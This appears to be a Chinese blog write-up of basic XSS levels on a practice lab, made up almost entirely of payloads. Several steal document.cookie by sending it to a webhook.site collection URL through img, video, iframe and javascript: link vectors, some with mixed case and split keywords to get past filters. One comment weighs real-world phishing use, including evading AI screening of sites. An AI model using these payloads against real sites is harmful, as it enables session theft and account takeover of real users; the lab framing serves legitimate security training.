---
title: 好靶场XSS-1(基础)
published: 2026-09-20 17:46
description: Cookie、点击劫持、iframe/图片/视频标签及反射型闭合利用
tags:
  - XSS
  - 靶场
category: 网络安全
draft: false
---

# 学Xss要会打Cookie

先确认xss漏洞存在

```
<script>alert(1)</script>
```

webhook.site 会给出一个临时url，利用以下poc：

```js
<script>
setTimeout(() => {
    const img = new Image();
    img.src = 'https://webhook.site/xxx?c=' + encodeURIComponent(document.cookie);
}, 3000);
</script>
```

**技术要点**：

- `setTimeout(..., 3000)`：等待3秒确保flag已注入
    
- `Image()`对象：绕过CORS限制，图片资源可跨域加载；无预检请求，避免OPTIONS方法拦截；相比fetch更不易被检测
    
- `encodeURIComponent()`：确保特殊字符正确传输

# 点击劫持了解吗

测试绕过payload，结果iframe可以

```js
<iframe srcdoc="<script>alert(1)</script>">
<iframe src="javascript:location.href='https://webhook.site/xxx?c='+document.cookie">
```

# 大大大,小小小

```
<ImG sRc=x OnErRoR="new Image().src='https://webhook.site/fc61e07f-6e96-4161-915c-010cb2fef8ee?c='+window['doc'+'ument']['cook'+'ie']">
// 在靶场：其实img根本不用大小写绕过，只需要修改cookie这个关键词即可，但是触发条件在实战可想而知，除非是钓鱼，但是现在一般都是先丢给ai看网站类型以及内容，所以钓鱼要求也越来越高了
<a href="JaVaScRiPt:location='https://webhook.site/fc61e07f-6e96-4161-915c-010cb2fef8ee?c='+encodeURIComponent(window['doc'+'ument']['coo'+'kie'])">点击领取</a>
```

# 我爱看视频你爱看什么？

```
<video src=x onerror="new Image().src='https://webhook.site/fc61e07f-6e96-4161-915c-010cb2fef8ee?c='+document.cookie"></video>
```

# 你知道图片标签吗

```
<img src=x onerror="new Image().src='https://webhook.site/fc61e07f-6e96-4161-915c-010cb2fef8ee?c='+document.cookie">
```

# 登录框存在反射型XSS

看了眼源代码，直接闭合标签就行

```
"><script>alert(1)</script>
```